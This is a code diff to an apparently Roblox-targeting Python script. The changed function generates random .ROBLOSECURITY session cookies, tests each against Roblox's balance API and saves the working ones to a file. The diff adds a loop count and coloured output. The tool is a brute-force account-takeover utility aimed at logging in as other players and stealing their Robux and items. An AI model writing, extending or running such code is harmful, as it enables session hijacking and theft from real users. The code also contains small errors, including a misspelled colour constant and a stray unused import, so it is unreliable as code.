@@ -1,3 +1,6 @@
+from ast import Return
+
+
 any_error = False
 try:
 	import time
@@ -1414,7 +1417,15 @@ def cookie_checker_gen():
 			break
 		else:
 			print("Enter A Valid Choice")
+	while True:
+		try:
+			amount = input("Enter How Many Cookies You Wanna Generate: ")
+			amount = int(amount)
+			break
+		except Exception:
+			print("Enter A Valid Choice")
 	choices = "ABCDEF123456789"
+	done = 0
 	while True:
 		numba1 = random.choices(choices, k=732)
 		cookie_to_check = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + ''.join(numba1)
@@ -1422,17 +1433,23 @@ def cookie_checker_gen():
 		r2 = requests.get("https://api.roblox.com/currency/balance", cookies={".ROBLOSECURITY": str(cookie_to_check)})
 		r2 = str(r2)
 		if "200" in r2:
-			print("Cookie Valid: " + str(cookie_to_check))
+			print(colorama.Fore.GREEEN + "Cookie Valid: " + str(cookie_to_check))
 			if save == "y":
 				file = open("valid_cookies.txt", "a")
 				file.write(cookie_to_check + "\n")
 				file.close()
 		if "200" not in r2:
-			print("Cookie Invalid: " + cookie_to_check)
+			print(colorama.Fore.RED + "Cookie Invalid: " + cookie_to_check)
 			if save == "y":
 				file2 = open("invalid_cookies.txt", "a")
 				file2.write(cookie_to_check + "\n")
-				file2.close()		
+				file2.close()
+		done = int(done) + 1
+		if int(done) == int(amount):
+			print("Done")
+			input("")
+			return
+
 	
 	
 	
